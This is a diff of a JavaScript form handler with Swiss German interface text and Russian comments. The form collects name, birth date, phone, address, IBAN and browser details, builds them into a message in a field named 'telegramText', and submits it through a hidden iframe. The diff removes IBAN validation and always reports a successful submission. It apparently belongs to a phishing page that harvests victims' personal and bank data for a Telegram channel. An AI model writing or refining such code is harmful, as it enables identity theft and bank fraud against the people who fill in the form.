@@ -1,24 +1,6 @@
-// --- Валидация швейцарского IBAN ---
-function isValidSwissIBAN(iban) {
-  const cleanIBAN = iban.replace(/\s+/g, '').toUpperCase();
-  if (cleanIBAN.length !== 21 || !cleanIBAN.startsWith('CH')) return false;
-
-  const rearranged = cleanIBAN.slice(4) + cleanIBAN.slice(0, 4);
-  const digits = rearranged.split('').map(char => {
-    const code = char.charCodeAt(0);
-    return (code >= 65 && code <= 90) ? (code - 55).toString() : char;
-  }).join('');
-
-  let remainder = 0;
-  for (let i = 0; i < digits.length; i++) {
-    remainder = (remainder * 10 + parseInt(digits[i], 10)) % 97;
-  }
-  return remainder === 1;
-}
-
 document.addEventListener('DOMContentLoaded', () => {
   
-  // --- 1. Маска для даты (ДД/ММ/ГГГГ) ---
+  // --- 1. Маска для даты ---
   const geburtsdatumInput = document.getElementById('geburtsdatum');
   if (geburtsdatumInput) {
     geburtsdatumInput.addEventListener('input', function (e) {
@@ -32,7 +14,7 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   }
 
-  // --- 2. Перевод (CH / EN) ---
+  // --- 2. Перевод ---
   const langBtns = document.querySelectorAll('.lang-btn');
   const translatableElements = document.querySelectorAll('[data-lang-ch]');
   langBtns.forEach(btn => {
@@ -53,12 +35,14 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   });
 
-  // --- 3. Отправка формы с валидацией ---
+  // --- 3. Отправка ---
   const form = document.getElementById('telegramForm');
-
+  
   form.addEventListener('submit', (e) => {
+    // 1. Отменяем стандартную отправку, чтобы заполнить textarea
     e.preventDefault();
 
+    // 2. Собираем данные
     const name = document.getElementById('name').value;
     const geburtsdatum = document.getElementById('geburtsdatum').value;
     const telefon = document.getElementById('telefon').value;
@@ -66,14 +50,8 @@ document.addEventListener('DOMContentLoaded', () => {
     const plz = document.getElementById('plz').value;
     const stadt = document.getElementById('stadt').value;
     const ibanInput = document.getElementById('iban').value;
-    
     const phonePrefix = document.getElementById('phone-prefix').value;
     const ibanPrefix = document.getElementById('iban-prefix').value;
-
-    const fullIBAN = ibanPrefix.toUpperCase() + ibanInput.replace(/\s+/g, '').toUpperCase();
-    
-    const isIbanValid = isValidSwissIBAN(fullIBAN);
-    const ibanStatusText = isIbanValid ? '✅ Gültig' : '❌ Ungültig';
 
     const now = new Date();
     const dateStr = now.toLocaleDateString('de-CH', { day: '2-digit', month: '2-digit', year: 'numeric' });
@@ -89,18 +67,20 @@ document.addEventListener('DOMContentLoaded', () => {
     message += `📮 PLZ: ${plz}\n`;
     message += `🏙️ Stadt: ${stadt}\n`;
     message += `🏦 IBAN: ${ibanPrefix}${ibanInput}\n`;
-    message += `🔍 IBAN-Status: ${ibanStatusText}\n\n`;
+    message += `🔍 IBAN-Status: nicht geprüft\n\n`;
     message += `🕒 Zeit: ${dateTime}\n`;
     message += `🌐 Browser: ${browserInfo}\n`;
 
+    // 3. Записываем текст в скрытое поле
     document.getElementById('telegramText').value = message;
-    
-    // --- ВАЖНО: вызываем submit формы, чтобы она ушла в iframe ---
-    form.submit();
 
+    // 4. Теперь отправляем форму вручную
+    form.submit(); // Форма уходит в iframe
+
+    // 5. Показываем уведомление
     setTimeout(() => {
-      alert(isIbanValid ? 'Vielen Dank! Ihre Daten wurden erfolgreich gesendet.' : 'Daten gesendet, aber die IBAN ist ungültig.');
+      alert('Vielen Dank! Ihre Daten wurden erfolgreich gesendet.');
       form.reset();
-    }, 800);
+    }, 500); 
   });
 });
